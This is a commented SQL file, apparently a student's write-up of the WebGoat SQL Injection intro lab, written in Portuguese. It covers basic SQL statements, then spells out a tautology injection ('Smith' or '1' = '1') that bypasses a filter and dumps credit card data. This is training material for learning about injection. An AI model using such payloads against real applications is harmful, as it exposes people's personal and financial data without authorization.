-- WebGoat - SQL Injection (intro)
-- OWASP: A03 - Injection
-- CWE-89

-- ===========================================================================
-- Passos 2 a 5: fundamentos de SQL (DML/DDL/DCL) usados na propria licao
-- ===========================================================================

-- Passo 2 (DML - SELECT): recuperar o departamento do Bob Franco
SELECT department FROM employees WHERE last_name = 'Franco';

-- Passo 3 (DML - UPDATE): alterar o departamento do Tobi Barnett
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';

-- Passo 4 (DDL - ALTER): adicionar coluna "phone" na tabela employees
ALTER TABLE employees ADD phone varchar(20);

-- Passo 5 (DCL - GRANT): conceder privilegios a um usuario nao autorizado
GRANT ALL ON grant_rights TO unauthorized_user;


-- ===========================================================================
-- Passo 9: INJECAO REAL - bypass de filtro via tautologia (o achado principal)
-- ===========================================================================
-- Formulario "Try It! String SQL injection" monta a query concatenando 3 campos:
--   Campo 1 (last_name): Smith'
--   Campo 2 (operador):  or
--   Campo 3 (condicao):  '1' = '1
--
-- Query final montada pelo servidor (SEM sanitizacao do input):
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1';

-- Resultado obtido: bypass total do filtro por last_name. A query retornou
-- TODOS os registros da tabela user_data, incluindo dados sensiveis:
-- USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT
-- (numeros de cartao de credito expostos sem qualquer autenticacao/autorizacao)

-- Explicacao tecnica (dada pelo proprio WebGoat):
-- "This injection works, because or '1' = '1' always evaluates to true
-- (the string ending literal for '1' is closed by the query itself).
-- So the injected query basically looks like this:
-- SELECT * FROM user_data WHERE (first_name = 'John' and last_name = '')
-- or (TRUE), which will always evaluate to true, no matter what came before it."
